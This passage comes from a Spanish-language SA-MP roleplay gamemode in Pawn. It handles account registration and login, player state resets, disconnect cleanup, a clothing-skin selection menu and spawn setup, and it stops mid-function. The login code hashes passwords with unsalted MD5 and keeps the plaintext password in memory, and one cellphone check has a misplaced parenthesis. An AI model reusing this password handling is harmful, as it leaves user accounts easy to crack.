public OnPlayerFirstLogin(playerid)
{
   	new rows,
		fields;

	cache_get_data(rows, fields);

	if(rows)
		ShowPlayerDialog(playerid, DLG_REGISTER, DIALOG_STYLE_PASSWORD, "�Ultimo paso!", "Para terminar de registrar tu cuenta, ingresa la contrase�a definitiva que solo tu conocer�s: \r\n{BE0000}- Debe tener al menos 6 caracteres y no mas de 16.", "Registar", "");
	else
 		KickPlayer(playerid, "el sistema", "contrase�a de registro incorrecta");
	return 1;
}

OnPlayerRegister(playerid, password[])
{
    if(IsPlayerConnected(playerid))
	{
		new query[128],
			name[MAX_PLAYER_NAME];

		GetPlayerName(playerid, name, sizeof(name));
		mysql_real_escape_string(name, name, 1, sizeof(name));
		mysql_real_escape_string(password, password, 1, sizeof(password[]));
		format(query, sizeof(query), "UPDATE `accounts` SET `Password` = MD5('%s'), `FirstLogin` = 0 WHERE `Name` = '%s'", password, name);
  		mysql_function_query(dbHandle, query, false, "", "");
		strmid(PlayerInfo[playerid][pKey], password, 0, strlen(password), 128);
		SendClientMessage(playerid, COLOR_YELLOW2, "�El registro ha finalizado exitosamente! Ya puedes jugar normalmente con la contrase�a que has elegido.");
		OnPlayerLogin(playerid, password);
		return 1;
	}
	return 0;
}

OnPlayerLogin(playerid, password[])
{
	new name[24],
		query[256];

	GetPlayerName(playerid, name, 24);
    mysql_real_escape_string(password, password, 1, sizeof(password[]));

    format(query, sizeof(query), "SELECT * FROM `accounts` WHERE UCASE(`Name`) = UCASE('%s') AND `Password` = MD5('%s')", name, password);
	mysql_function_query(dbHandle, query, true, "OnPlayerDataLoad", "i", playerid);
	return 1;
}

public ResetStats(playerid)
{
    MedDuty[playerid] = 0;
    
    /*TakeHeadShot[playerid] = 0;*/
    
	/* Vehiculos */
    OfferingVehicle[playerid] = false;
    VehicleOfferPrice[playerid] = -1;
    VehicleOffer[playerid] = INVALID_PLAYER_ID;
    VehicleOfferID[playerid] = -1;
	startingEngine[playerid] = false;
    
    /* Venta de casas */
	ResetHouseOffer(playerid);

	/* Venta de negocios */
	ResetBusinessOffer(playerid);
	
	// s0beit detector.
	firstSpawn[playerid] = 1;
	cheater[playerid] = 0;
	
	//Alcoholemia
	DrinksTaken[playerid] = 0;
	BlowingPipette[playerid] = 0;
    OfferingPipette[playerid] = 0;
	
	smoking[playerid] = false;
	LastVeh[playerid] = 0;
	AllowAdv[playerid] = 1;

	LastCP[playerid] = -1;
	CollectedProds[playerid] = 0;
	jobBreak[playerid] = 80;
	
	/* Sistema de Mecanicos y Tuning */
	ResetRepairOffer(playerid);
	
	/* Sistema de equipos PMA y SIDE */
	ResetPlayerInputs(playerid);
	
	/* Saludo */
	saluteOffer[playerid] = INVALID_PLAYER_ID;
	saluteStyle[playerid] = 0;
	
	/*Sistema de robo al banco*/
	ResetRobberyGroupVariables(playerid);

	/* Licencia de armas */
	wepLicOffer[playerid] = INVALID_PLAYER_ID;
	
	/* Revision de usuarios */
	ReviseOffer[playerid] = 999;
	
	/* Sistema de misiones automaticas */
	ResetMissionEventVariables(playerid);
	
	/* Sistema de camaras */
	usingCamera[playerid] = false;
	
	/* Sistema de m�scaras */
	usingMask[playerid] = false;
	
	/* Sistema de Picadas */
	resetSprintRace(playerid);

	/* Sistema de carreras */
	ResetPlayerRaceVariables(playerid);
	
	/* Descripciones de 3Dtexts */
	ResetDescVariables(playerid);
	
	/* Mascara 3Dtexts */
	ResetMaskVariables(playerid);
	
	/* Sistema de stream de radios */
	hearingRadioStream[playerid] = false;
	
	/* Sistema de entrevistas para CTRMAN */
	InterviewOffer[playerid] = 999;
	InterviewActive[playerid] = false;
	
	/* Cargando Nafta */
	fillingFuel[playerid] = false;
	
	/* Sistema de casino */
	isBetingRoulette[playerid] = false;
	isBetingFortune[playerid] = false;
	
	/* Sistema de hambre y sed */
    PlayerInfo[playerid][pThirst] = 100;
	PlayerInfo[playerid][pHunger] = 100;
	
	/* Sistema de Adiccion y Drogas */
	RehabOffer[playerid] = 999;
 	DrugOfferType[playerid] = 0;
 	DrugOffer[playerid] = INVALID_PLAYER_ID;
	DrugOfferAmount[playerid] = 0;
	SellingDrugs[playerid] = false;
	DrugEffectEcstasy[playerid] = false;
	DrugEffectLSD[playerid] = false;
	DrugEffectCocaine[playerid] = false;
	DrugEffectMarijuana[playerid] = false;
	PlayerInfo[playerid][pAdictionPercent] = 0.0;
	PlayerInfo[playerid][pAdictionAbstinence] = 999999999;
	
	/* Cintur�n de Seguridad */
	SeatBelt[playerid] = false;

	/* Sistema de toggle */
	PMsEnabled[playerid] = true;
	NicksEnabled[playerid] = true;
	NewsEnabled[playerid] = true;
	RadioEnabled[playerid] = true;
	FactionEnabled[playerid] = true;
	PhoneEnabled[playerid] = true;
	TalkAnimEnabled[playerid] = false;
	HudEnabled[playerid] = true;
	
	/* Sistema de tazer */
	resetTazer(playerid);

	MechanicCallTime[playerid] = 0;
	TaxiCallTime[playerid] = 0;
	TaxiAccepted[playerid] = 999;
	TransportPassenger[playerid] = 999;
	TransportDriver[playerid] = 999;
	TransportCost[playerid] = 0;

    dyingCamera[playerid] = false;
	carryingProd[playerid] = false;
    jobDuty[playerid] = false;
	RegCounter[playerid] = 1;
	Choice[playerid] = 0;
	TicketOffer[playerid] = 999;
	TicketMoney[playerid] = 0;
	PlayerCuffed[playerid] = 0;
	CopDuty[playerid] = 0;
	SIDEDuty[playerid] = 0;
	AdminDuty[playerid] = 0;
	StartedCall[playerid] = 0;
	Muted[playerid] = 0;
	HospHealing[playerid] = 0;
	SetPlayerColor(playerid, COLOR_NOTLOGGED);
	SpawnAttempts[playerid] = 0;
	FactionRequest[playerid] = 0;
	Mobile[playerid] = 255;
	gPlayerLogged[playerid] = 0;

	resetAuxiliarItemsPMA(playerid);

	ResetAfkVariables(playerid);

	playerLicense[playerid][lDStep] = 0;
	playerLicense[playerid][lDTaking] = 0;
	playerLicense[playerid][lDTime] = 0;
	playerLicense[playerid][lDMaxSpeed] = 0.0;
	
	PlayerInfo[playerid][pMarijuana] = 0;
	PlayerInfo[playerid][pLSD] = 0;
	PlayerInfo[playerid][pEcstasy] = 0;
	PlayerInfo[playerid][pCocaine] = 0;
	PlayerInfo[playerid][pCigarettes] = 0;
	PlayerInfo[playerid][pLighter] = 0;
	
	PlayerInfo[playerid][pFightStyle] = 0;
	PlayerInfo[playerid][pMuteB] = 0;

	resetThiefVariables(playerid);

	PlayerInfo[playerid][pID] = 0;
	PlayerInfo[playerid][pCantWork] = 0;
	PlayerInfo[playerid][pWantedLevel] = 0;
	PlayerInfo[playerid][pBizKey] = 0;
	PlayerInfo[playerid][pWarnings] = 0;
	PlayerInfo[playerid][pRegStep] = 0;
	PlayerInfo[playerid][pLevel] = 1;
	PlayerInfo[playerid][pName] = "BUGBUGBUGBUGBUGBUGBUGBU";
	PlayerInfo[playerid][pLastConnected] = "BUGBUGBUGBUGBUGBUGBUGBUG";
	PlayerInfo[playerid][pIP] = "BUG.BUG.BUG.BUG";
	PlayerInfo[playerid][pAdmin] = 0;
	PlayerInfo[playerid][pAccountBlocked] = 0;
	PlayerInfo[playerid][pTutorial] = 0;
	PlayerInfo[playerid][pSex] = 1;
	PlayerInfo[playerid][pAge] = 0;
	PlayerInfo[playerid][pExp] = 0;
	PlayerInfo[playerid][pCash] = 0;
	PlayerInfo[playerid][pBank] = 0;
	PlayerInfo[playerid][pSkin] = 0;
	PlayerInfo[playerid][pMask] = 0;
	PlayerInfo[playerid][pRadio] = 0;
	PlayerInfo[playerid][pJob] = 0;
	PlayerInfo[playerid][pJobTime] = 0;
	PlayerInfo[playerid][pJobAllowed] = 1;
	PlayerInfo[playerid][pPlayingHours] = 0;
	PlayerInfo[playerid][pPayCheck] = 0;
	PlayerInfo[playerid][pFaction] = 0;
	PlayerInfo[playerid][pRank] = 0;
	PlayerInfo[playerid][pHouseKey] = 0;
	PlayerInfo[playerid][pHouseKeyIncome] = 0;
	PlayerInfo[playerid][pBizKey] = 0;
	PlayerInfo[playerid][pWarnings] = 0;
	PlayerInfo[playerid][pCarLic] = 0;
	PlayerInfo[playerid][pWepLic] = 0;
	PlayerInfo[playerid][pFlyLic] = 0;
	PlayerInfo[playerid][pPhoneNumber] = 0;
	PlayerInfo[playerid][pPhoneC] = 255;
	PlayerInfo[playerid][pListNumber] = 1;
	PlayerInfo[playerid][pJailed] = 0;
	PlayerInfo[playerid][pJailTime] = 0;
	PlayerInfo[playerid][pX] = 1481.2136;
	PlayerInfo[playerid][pY] = -1751.6758;
	PlayerInfo[playerid][pZ] = 15.4453;
	PlayerInfo[playerid][pA] = 358.1794;
	PlayerInfo[playerid][pInterior] = 0;
	PlayerInfo[playerid][pVirtualWorld] = 0;
	PlayerInfo[playerid][pHospitalized] = 0;
	PlayerInfo[playerid][pHealth] = 100.0;
	PlayerInfo[playerid][pArmour] = 0;
	PlayerInfo[playerid][pSpectating] = INVALID_PLAYER_ID;
	PlayerInfo[playerid][pRentCarID] = 0;
	PlayerInfo[playerid][pRentCarRID] = 0;

    gHeaderTextDrawId[playerid] = PlayerText:INVALID_TEXT_DRAW;
    gBackgroundTextDrawId[playerid] = PlayerText:INVALID_TEXT_DRAW;
    gCurrentPageTextDrawId[playerid] = PlayerText:INVALID_TEXT_DRAW;
    gNextButtonTextDrawId[playerid] = PlayerText:INVALID_TEXT_DRAW;
    gPrevButtonTextDrawId[playerid] = PlayerText:INVALID_TEXT_DRAW;

    for(new x=0; x < SELECTION_ITEMS; x++) {
        gSelectionItems[playerid][x] = PlayerText:INVALID_TEXT_DRAW;
	}

	gItemAt[playerid] = 0;
	return 0;
}

public OnPlayerDisconnect(playerid, reason)
{
	new string[64];
	
	if(PhoneHand[playerid] == 1)
	{
	    SetHandItemAndParam(playerid, HAND_RIGHT, 0, 0);
		PhoneHand[playerid] = 0;
	}
	
	if(InEnforcer[playerid] == 1)
	{
		new Float:X, Float:Y, Float:Z;
		GetVehiclePos(InEnforcer[playerid], X, Y, Z);
		SetPlayerPos(playerid, X+4, Y, Z);
		SetPlayerInterior(playerid, 0);
		InEnforcer[playerid] = 0;
	}

    TextDrawHideForPlayer(playerid, textdrawVariables[1]);
	ResetDescLabel(playerid);
 	ResetMaskLabel(playerid);
	
    KillTimer(timersID[10]);
    KillTimer(GetPVarInt(playerid, "CancelVehicleTransfer"));
    KillTimer(GetPVarInt(playerid, "CancelDrugTransfer"));
    KillTimer(GetPVarInt(playerid, "jobBreakTimerID"));
    KillTimer(GetPVarInt(playerid, "tutTimer"));
    KillTimer(GetPVarInt(playerid, "garbT"));
    KillTimer(GetPVarInt(playerid, "robberyCancel"));
    KillTimer(GetPVarInt(playerid, "theftTimer"));
    KillTimer(GetPVarInt(playerid, "fuelCar"));
	KillTimer(GetPVarInt(playerid, "fuelCarWithCan"));
	DestroyAfkTimer(playerid);
	KillMissionEventTimer(playerid);
	
	if(GetPlayerSpecialAction(Mobile[playerid] == SPECIAL_ACTION_USECELLPHONE && !IsPlayerInAnyVehicle(Mobile[playerid]))) {
		SetPlayerSpecialAction(Mobile[playerid], SPECIAL_ACTION_STOPUSECELLPHONE);
	}
    
   	if(DrugEffectLSD[playerid] == true)// Para que no se guarde con la vida extra del LSD
	{
		new Float:playerHealth;
		GetPlayerHealthEx(playerid, playerHealth);
		if(playerHealth > 100.0)
	    	SetPlayerHealthEx(playerid, 100.0);
    }
    
    foreach(new i : Player)
	{
		if(TaxiAccepted[i] < 999)
		{
			if(TaxiAccepted[i] == playerid)
			{
				TaxiAccepted[i] = 999;
				GameTextForPlayer(i, "~w~El cliente~r~ha dejado el juego", 2000, 1);
				TaxiCallTime[i] = 0;
				DisablePlayerCheckpoint(i);
			}
		}

		if(PlayerInfo[i][pSpectating] == playerid)
		{
			PlayerInfo[i][pSpectating] = INVALID_PLAYER_ID;
			TogglePlayerSpectating(i, false);
			SetCameraBehindPlayer(i);
			SetPlayerPos(i, PlayerInfo[i][pX], PlayerInfo[i][pY], PlayerInfo[i][pZ]);
			SetPlayerInterior(i, PlayerInfo[i][pInterior]);
			SetPlayerVirtualWorld(i, PlayerInfo[i][pVirtualWorld]);
			TextDrawHideForPlayer(i, textdrawVariables[0]);
			SendClientMessage(i, COLOR_WHITE, "{878EE7}[INFO]:{C8C8C8} el jugador al que estabas specteando se ha desconectado.");
		}
	}

	if(jobDuty[playerid]) {
	    if(PlayerInfo[playerid][pJob] == JOB_TAXI && TransportPassenger[playerid] < 999) {
			SendClientMessage(TransportPassenger[playerid], COLOR_YELLOW2, "El conductor ha dejado el juego, por favor espera a que se reconecte.");
			TransportDriver[TransportPassenger[playerid]] = 999;
		} else if(PlayerInfo[playerid][pJob] == JOB_GARB) {
			SetVehicleToRespawn(GetPVarInt(playerid, "jobVehicle"));
		}
	}
	
	if(TransportDriver[playerid] < 999) {
		if(TransportCost[TransportDriver[playerid]] > 0) {
			if(IsPlayerConnected(TransportDriver[playerid])) {
				format(string, sizeof(string), "~w~El pasajero~r~ha dejado el juego~n~~g~Dinero ganado: $%d", TransportCost[TransportDriver[playerid]]);
				GameTextForPlayer(TransportDriver[playerid], string, 2000, 1);
				if(GetPVarInt(TransportDriver[playerid], "pJobLimitCounter") <= JOB_TAXI_MAXPASSENGERS) {
				    SetPVarInt(TransportDriver[playerid], "pJobLimitCounter", GetPVarInt(TransportDriver[playerid], "pJobLimitCounter") + 1);
					PlayerInfo[TransportDriver[playerid]][pPayCheck] += PRICE_TAXI_PERPASSENGER;
				}
				GivePlayerCash(playerid, -TransportCost[TransportDriver[playerid]]);
				GivePlayerCash(TransportDriver[playerid], TransportCost[TransportDriver[playerid]]);
				TransportCost[TransportDriver[playerid]] = 0;
				TransportPassenger[TransportDriver[playerid]] = 999;
				TransportDriver[playerid] = 999;
			}
		}
	}

	OnPlayerLeaveRobberyGroup(playerid, 1);
	
    if(gPlayerLogged[playerid]) {
		switch(reason) {
	        case 0,2:{
				PlayerLocalMessage(playerid, 30.0, "se ha desconectado (raz�n: crash).");
			}
			case 1:{
			    PlayerLocalMessage(playerid, 30.0, "se ha desconectado (raz�n: a voluntad).");
			}
	    }
		SaveAccount(playerid);
	}
	
	EndPlayerDuty(playerid);
	
	deleteAuxiliarItemsPMA(playerid, PMA_CONE_ITEM);
	deleteAuxiliarItemsPMA(playerid, PMA_BARRICATE_ITEM);

	deleteAbandonedSprintRace(playerid);
	OnPlayerLeaveRace(playerid);
	
	if(hearingRadioStream[playerid])
		StopAudioStreamForPlayer(playerid);
	
	HidePlayerBasicNeeds(playerid); // Destruimos las barras de hambre y sed, y ocultamos los textdraws
	
	HidePlayerSpeedo(playerid);
	KillTimer(pSpeedoTimer[playerid]); // Si se desonect� estando arriba del auto, borramos el timer recursivo de la gasolina
	
	HideGangZonesToPlayer(playerid);
	
	return 1;
}

// Selector de skins.
stock GetNumberOfPages(skintype) {
	new totalItems;

	switch(skintype) {
	    case 1: totalItems = SKINS_M_1;
	    case 2: totalItems = SKINS_M_2;
	    case 3: totalItems = SKINS_F_1;
	    case 4: totalItems = SKINS_F_2;
	}
	
	if((totalItems >= SELECTION_ITEMS) && (totalItems % SELECTION_ITEMS) == 0) {
		return (totalItems / SELECTION_ITEMS);
	}
	else return (totalItems / SELECTION_ITEMS) + 1;
}

PlayerText:CreateCurrentPageTextDraw(playerid, Float:Xpos, Float:Ypos) {
	new PlayerText:txtInit;
   	txtInit = CreatePlayerTextDraw(playerid, Xpos, Ypos, "0/0");
   	PlayerTextDrawUseBox(playerid, txtInit, 0);
	PlayerTextDrawLetterSize(playerid, txtInit, 0.4, 1.1);
	PlayerTextDrawFont(playerid, txtInit, 1);
	PlayerTextDrawSetShadow(playerid, txtInit, 0);
    PlayerTextDrawSetOutline(playerid, txtInit, 1);
    PlayerTextDrawColor(playerid, txtInit, 0xACCBF1FF);
    PlayerTextDrawShow(playerid, txtInit);
    return txtInit;
}

PlayerText:CreatePlayerDialogButton(playerid, Float:Xpos, Float:Ypos, Float:Width, Float:Height, button_text[]) {
 	new PlayerText:txtInit;
   	txtInit = CreatePlayerTextDraw(playerid, Xpos, Ypos, button_text);
   	PlayerTextDrawUseBox(playerid, txtInit, 1);
   	PlayerTextDrawBoxColor(playerid, txtInit, 0x000000FF);
   	PlayerTextDrawBackgroundColor(playerid, txtInit, 0x000000FF);
	PlayerTextDrawLetterSize(playerid, txtInit, 0.4, 1.1);
	PlayerTextDrawFont(playerid, txtInit, 1);
	PlayerTextDrawSetShadow(playerid, txtInit, 0); // no shadow
    PlayerTextDrawSetOutline(playerid, txtInit, 0);
    PlayerTextDrawColor(playerid, txtInit, 0x4A5A6BFF);
    PlayerTextDrawSetSelectable(playerid, txtInit, 1);
    PlayerTextDrawAlignment(playerid, txtInit, 2);
    PlayerTextDrawTextSize(playerid, txtInit, Height, Width); // The width and height are reversed for centering.. something the game does <g>
    PlayerTextDrawShow(playerid, txtInit);
    return txtInit;
}

PlayerText:CreatePlayerHeaderTextDraw(playerid, Float:Xpos, Float:Ypos, header_text[]) {
	new PlayerText:txtInit;
   	txtInit = CreatePlayerTextDraw(playerid, Xpos, Ypos, header_text);
   	PlayerTextDrawUseBox(playerid, txtInit, 0);
	PlayerTextDrawLetterSize(playerid, txtInit, 1.25, 3.0);
	PlayerTextDrawFont(playerid, txtInit, 0);
	PlayerTextDrawSetShadow(playerid, txtInit, 0);
    PlayerTextDrawSetOutline(playerid, txtInit, 1);
    PlayerTextDrawColor(playerid, txtInit, 0xACCBF1FF);
    PlayerTextDrawShow(playerid, txtInit);
    return txtInit;
}

PlayerText:CreatePlayerBackgroundTextDraw(playerid, Float:Xpos, Float:Ypos, Float:Width, Float:Height) {
	new PlayerText:txtBackground = CreatePlayerTextDraw(playerid, Xpos, Ypos,
	"                                            ~n~"); // enough space for everyone
    PlayerTextDrawUseBox(playerid, txtBackground, 1);
    PlayerTextDrawBoxColor(playerid, txtBackground, 0x4A5A6BBB);
	PlayerTextDrawLetterSize(playerid, txtBackground, 5.0, 5.0);
	PlayerTextDrawFont(playerid, txtBackground, 0);
	PlayerTextDrawSetShadow(playerid, txtBackground, 0);
    PlayerTextDrawSetOutline(playerid, txtBackground, 0);
    PlayerTextDrawColor(playerid, txtBackground,0x000000FF);
    PlayerTextDrawTextSize(playerid, txtBackground, Width, Height);
   	PlayerTextDrawBackgroundColor(playerid, txtBackground, 0x4A5A6BBB);
    PlayerTextDrawShow(playerid, txtBackground);
    return txtBackground;
}

PlayerText:CreateModelPreviewTextDraw(playerid, modelindex, Float:Xpos, Float:Ypos, Float:width, Float:height) {
    new PlayerText:txtPlayerSprite = CreatePlayerTextDraw(playerid, Xpos, Ypos, ""); // it has to be set with SetText later
    PlayerTextDrawFont(playerid, txtPlayerSprite, TEXT_DRAW_FONT_MODEL_PREVIEW);
    PlayerTextDrawColor(playerid, txtPlayerSprite, 0xFFFFFFFF);
    PlayerTextDrawBackgroundColor(playerid, txtPlayerSprite, 0x88888899);
    PlayerTextDrawTextSize(playerid, txtPlayerSprite, width, height); // Text size is the Width:Height
    PlayerTextDrawSetPreviewModel(playerid, txtPlayerSprite, modelindex);
    PlayerTextDrawSetSelectable(playerid, txtPlayerSprite, 1);
    PlayerTextDrawShow(playerid,txtPlayerSprite);
    return txtPlayerSprite;
}

DestroyPlayerModelPreviews(playerid) {
	new x=0;
	while(x != SELECTION_ITEMS) {
	    if(gSelectionItems[playerid][x] != PlayerText:INVALID_TEXT_DRAW) {
			PlayerTextDrawDestroy(playerid, gSelectionItems[playerid][x]);
			gSelectionItems[playerid][x] = PlayerText:INVALID_TEXT_DRAW;
		}
		x++;
	}
}

ShowPlayerModelPreviews(playerid, skintype) {
	new totalItems;
    new x=0;
	new Float:BaseX = DIALOG_BASE_X;
	new Float:BaseY = DIALOG_BASE_Y - (SPRITE_DIM_Y * 0.33); // down a bit
	new linetracker = 0;

	new itemat = GetPVarInt(playerid, "skinc_page") * SELECTION_ITEMS;

	// Destroy any previous ones created
	DestroyPlayerModelPreviews(playerid);
	
	switch(skintype) {
	    case 1: totalItems = SKINS_M_1;
	    case 2: totalItems = SKINS_M_2;
	    case 3: totalItems = SKINS_F_1;
	    case 4: totalItems = SKINS_F_2;
	}

	while(x != SELECTION_ITEMS && itemat < totalItems) {
	    if(linetracker == 0) {
	        BaseX = DIALOG_BASE_X + 25.0; // in a bit from the box
	        BaseY += SPRITE_DIM_Y + 1.0; // move on the Y for the next line
		}
		switch(skintype) {
		    case 1: {
		    	gSelectionItems[playerid][x] = CreateModelPreviewTextDraw(playerid, maleSkins1[itemat], BaseX, BaseY, SPRITE_DIM_X, SPRITE_DIM_Y);
  				gSelectionItemsTag[playerid][x] = maleSkins1[itemat];
		    }
		    case 2: {
		    	gSelectionItems[playerid][x] = CreateModelPreviewTextDraw(playerid, maleSkins2[itemat], BaseX, BaseY, SPRITE_DIM_X, SPRITE_DIM_Y);
  				gSelectionItemsTag[playerid][x] = maleSkins2[itemat];
		    }
		    case 3: {
		    	gSelectionItems[playerid][x] = CreateModelPreviewTextDraw(playerid, femaleSkins1[itemat], BaseX, BaseY, SPRITE_DIM_X, SPRITE_DIM_Y);
  				gSelectionItemsTag[playerid][x] = femaleSkins1[itemat];
		    }
		    case 4:  {
		    	gSelectionItems[playerid][x] = CreateModelPreviewTextDraw(playerid, femaleSkins2[itemat], BaseX, BaseY, SPRITE_DIM_X, SPRITE_DIM_Y);
  				gSelectionItemsTag[playerid][x] = femaleSkins2[itemat];
		    }
		}
		BaseX += SPRITE_DIM_X + 1.0; // move on the X for the next sprite
		linetracker++;
		if(linetracker == ITEMS_PER_LINE) linetracker = 0;
		itemat++;
		x++;
	}
}

UpdatePageTextDraw(playerid, skintype)
{
	new PageText[64+1];
	
	format(PageText, 64, "%d/%d", GetPVarInt(playerid,"skinc_page") + 1, GetNumberOfPages(skintype));
	PlayerTextDrawSetString(playerid, gCurrentPageTextDrawId[playerid], PageText);
}

CreateSelectionMenu(playerid, skintype)
{
	new string[128];
	
    gBackgroundTextDrawId[playerid] = CreatePlayerBackgroundTextDraw(playerid, DIALOG_BASE_X, DIALOG_BASE_Y + 20.0, DIALOG_WIDTH, DIALOG_HEIGHT);
    switch(skintype)
	{
		case 1, 3: format(string, sizeof(string), "Ropa urbana $%d", PRICE_CLOTHES1);
		case 2, 4: format(string, sizeof(string), "Ropa fina $%d", PRICE_CLOTHES2);
	}
	gHeaderTextDrawId[playerid] = CreatePlayerHeaderTextDraw(playerid, DIALOG_BASE_X, DIALOG_BASE_Y, string);
    gCurrentPageTextDrawId[playerid] = CreateCurrentPageTextDraw(playerid, DIALOG_WIDTH - 30.0, DIALOG_BASE_Y + 15.0);
    gNextButtonTextDrawId[playerid] = CreatePlayerDialogButton(playerid, DIALOG_WIDTH - 30.0, DIALOG_BASE_Y+DIALOG_HEIGHT+100.0, 50.0, 16.0, ">>>>");
    gPrevButtonTextDrawId[playerid] = CreatePlayerDialogButton(playerid, DIALOG_WIDTH - 90.0, DIALOG_BASE_Y+DIALOG_HEIGHT+100.0, 50.0, 16.0, "<<<<");

    ShowPlayerModelPreviews(playerid, skintype);
    UpdatePageTextDraw(playerid, skintype);
}

DestroySelectionMenu(playerid)
{
    TogglePlayerControllable(playerid, true);
    
	DestroyPlayerModelPreviews(playerid);

	PlayerTextDrawDestroy(playerid, gHeaderTextDrawId[playerid]);
	PlayerTextDrawDestroy(playerid, gBackgroundTextDrawId[playerid]);
	PlayerTextDrawDestroy(playerid, gCurrentPageTextDrawId[playerid]);
	PlayerTextDrawDestroy(playerid, gNextButtonTextDrawId[playerid]);
	PlayerTextDrawDestroy(playerid, gPrevButtonTextDrawId[playerid]);

	gHeaderTextDrawId[playerid] = PlayerText:INVALID_TEXT_DRAW;
    gBackgroundTextDrawId[playerid] = PlayerText:INVALID_TEXT_DRAW;
    gCurrentPageTextDrawId[playerid] = PlayerText:INVALID_TEXT_DRAW;
    gNextButtonTextDrawId[playerid] = PlayerText:INVALID_TEXT_DRAW;
    gPrevButtonTextDrawId[playerid] = PlayerText:INVALID_TEXT_DRAW;
}

HandlePlayerItemSelection(playerid, selecteditem, skintype)
{
	// In this case we change the player's skin
  	if(gSelectionItemsTag[playerid][selecteditem] >= 0 && gSelectionItemsTag[playerid][selecteditem] < 300)
	{
		switch(skintype)
		{
			case 1, 3:
			{
				if(GetPlayerCash(playerid) < PRICE_CLOTHES1)
				{
				    SendFMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario ($%d).", PRICE_CLOTHES1);
					return 1;
				}
				GivePlayerCash(playerid, -PRICE_CLOTHES1);
				new business = GetPlayerBusiness(playerid);
		        if(business != 0 && Business[business][bType] == BIZ_CLOT)
		        {
					Business[business][bTill] += PRICE_CLOTHES1;
					Business[business][bProducts]--;
					saveBusiness(business);
				}
			}
			case 2, 4:
			{
			    if(GetPlayerCash(playerid) < PRICE_CLOTHES2)
			    {
					SendFMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario ($%d).", PRICE_CLOTHES2);
					return 1;
   				}
     			GivePlayerCash(playerid, -PRICE_CLOTHES2);
	       		new business = GetPlayerBusiness(playerid);
		        if(business != 0 && Business[business][bType] == BIZ_CLOT2)
		        {
					Business[business][bTill] += PRICE_CLOTHES2;
					Business[business][bProducts]--;
					saveBusiness(business);
				}
			}
		}
        SetPlayerSkin(playerid, gSelectionItemsTag[playerid][selecteditem]);
        PlayerActionMessage(playerid, 15.0, "compra unas vestimentas en el negocio y se las viste en el probador.");
        PlayerInfo[playerid][pSkin] = gSelectionItemsTag[playerid][selecteditem];
		return 1;
	}
	return 1;
}
//

public OnPlayerSpawn(playerid)
{
    //============PRE CARGA DE LAS LIBRERIAS DE LAS ANIMACIONES=================
    
	ApplyAnimation(playerid, "ATTRACTORS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BLOWJOBZ", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BOMBER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "COP_AMBIENT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "CRACK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DANCING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DEALER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "DODGE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "FOOD", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GANGS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GHANDS", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GRAFFITI", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GRAVEYARD", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "GRENADE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "HEIST9", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "INT_HOUSE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "INT_SHOP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "KISSING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "KNIFE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "LOWRIDER", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MD_CHASE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MEDIC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MISC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "MUSCULAR", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PARK", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PAULNMAC", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "PED", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "POLICE", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RAPPING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "RIOT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SHOP", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SMOKING", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWAT", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "SWEET", "null", 0.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "WUZI", "null", 0.0, 0, 0, 0, 0, 0);
	
	//==========================================================================

    StartAfkTimer(playerid);

	if(gPlayerLogged[playerid])
	{
	    SetPlayerSpawn(playerid);
	    TextDrawShowForPlayer(playerid, textdrawVariables[1]);

	    SetPVarInt(playerid, "died", 0);
	    
		if(PlayerInfo[playerid][pHospitalized] >= 1)
		{
		    initiateHospital(playerid);
		}
	}
	
	/*TakeHeadShot[playerid] = 0;*/
	
	LoadHandItem(playerid, HAND_RIGHT);
	LoadHandItem(playerid, HAND_LEFT);
	AttachBackItem(playerid);
    LoadToysItems(playerid);

	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	new string[128],
		time = gettime();
		
	SetPVarInt(playerid, "died", 1);
	SetPVarInt(playerid, "disabled", DISABLE_NONE);
	
 	switch(time - LastDeath[playerid])
	 {
        case 0 .. 3:
		{
            DeathSpam{playerid}++;
            if(DeathSpam{playerid} == 3)
